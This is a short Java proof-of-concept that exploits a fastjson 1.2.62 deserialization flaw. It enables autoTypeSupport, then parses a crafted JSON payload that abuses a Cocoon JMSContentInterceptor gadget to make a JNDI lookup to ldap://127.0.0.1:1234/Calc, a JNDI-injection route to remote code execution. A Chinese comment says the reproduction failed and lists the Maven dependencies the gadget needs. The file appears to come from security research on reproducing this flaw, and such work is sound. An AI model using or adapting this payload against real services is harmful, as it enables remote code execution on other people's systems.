package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
/*
    复现失败
    需要开启autoTypeSupport
    <dependency>
        <groupId>slide</groupId>
        <artifactId>slide-kernel</artifactId>
        <version>2.1</version>
    </dependency>
    <dependency>
        <groupId>cocoon</groupId>
        <artifactId>cocoon-slide</artifactId>
        <version>2.1.11</version>
    </dependency>
    <dependency>
            <groupId>javax</groupId>
            <artifactId>javaee-api</artifactId>
            <version>8.0.1</version>
    </dependency>
*/
public class Poc_1_2_62_a {
    public static void main(String[] args) throws Exception{
        // turn on autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://127.0.0.1:1234/Calc\"}, \"namespace\":\"\"}";
        JSON.parse(payload);
    }
}
